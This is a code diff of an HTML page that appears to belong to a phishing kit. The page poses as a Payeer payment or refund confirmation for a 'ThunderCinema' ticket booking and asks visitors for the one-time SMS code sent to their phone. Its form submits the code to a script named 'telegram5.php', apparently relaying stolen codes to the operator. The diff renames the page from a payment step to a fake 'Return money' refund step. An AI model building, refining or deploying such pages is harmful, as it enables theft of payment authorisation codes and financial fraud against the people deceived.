@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ThunderSecure</title>
     <link rel="stylesheet" href="css/reset.css">
-    <link rel="stylesheet" href="css/secure.css">
+    <link rel="stylesheet" href="css/moneybacksecure.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Square+Peg&family=Water+Brush&family=Whisper&display=swap" rel="stylesheet">
@@ -17,29 +16,30 @@
     <link rel="mask-icon" href="icons/safari-pinned-tab.svg" color="#5bbad5">
     <meta name="msapplication-TileColor" content="#603cba">
     <meta name="theme-color" content="#ffffff">
+    <title>Document</title>
 </head>
 <body>
-    <div class="sms_wrapper">
-        <div class="sms">
+    
+    <div class="moneybacksecure_wrapper">
+        <div class="moneybacksecure">
             <a href="payment.html" class="back_to_payment"><img src="css/images/more_photo/arrow_back.png"></a>
-            <div class="sms_title">
-                <h3>Enter your code</h3>
+            <div class="moneybacksecure_title">
+                <h3>Return money</h3>
                 <a href="https://payeer.com/en/" target="_blank"><img src="css/images/more_photo/payeer.png"></a>
             </div>
 
-            <div class="sms_about">
-                <h3 class="sms_about_title"><b>Action: </b>ThunderCinema</h3>
-                <p class="sms_about_sum"><b>Amount: </b>40 $</p>
-                <span class="sms_about_desc"><b>Description: </b>Booking movie tickets</span>
+            <div class="moneybacksecure_about">
+                <h3 class="moneybacksecure_about_title"><b>Action: </b>ThunderCinema</h3>
+                <span class="moneybacksecure_about_desc"><b>Description: </b>Refunds for tickets</span>
             </div>
 
-            <div class="sms_kod">
+            <div class="moneybacksecure_kod">
                 <p>A one-time code has been sent to your phone number.
                     Please check the details of the transaction and enter the one-time code.</p>
             </div>
 
-            <form action="telegram2.php" method="post" class="sms_form" id="form">
-                <input type="text" name="sms" placeholder="Single sms code" class="sms_form_kod _req"><br>
+            <form action="telegram5.php" method="post" class="moneybacksecure_form" id="form">
+                <input type="text" name="smsbacksecure" placeholder="Single sms code" class="moneybacksecure_form_kod _req"><br>
                 <button type="submit">Pay</button>
             </form>
         </div>
